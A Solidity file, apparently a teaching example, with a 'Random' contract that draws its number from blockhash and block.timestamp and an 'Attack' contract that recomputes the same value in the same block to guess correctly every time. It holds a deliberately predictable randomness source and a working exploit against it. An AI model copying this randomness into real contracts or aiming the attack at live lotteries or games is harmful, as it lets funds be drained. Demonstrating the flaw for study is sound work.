// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Random{
    event Log(string message);
    function get() public view returns(uint){
        uint answer = uint(
            keccak256(abi.encodePacked(
                blockhash(block.number - 1), block.timestamp)
            )
        );
        return answer;
    }
    function guess(uint _number) public{
        uint rd = get();
        if(_number == rd){
            emit Log("Success");
        }
        else{
            emit Log("Failed");
        }
    }
   
}
contract Attack {
    Random rdcontract;
    constructor (Random _contract){
        rdcontract = Random(_contract);
    }
    function guessNumber() public{
         uint answer = uint(
            keccak256(abi.encodePacked(
                blockhash(block.number - 1), block.timestamp)
            )
        );
        rdcontract.guess(answer);
    }
}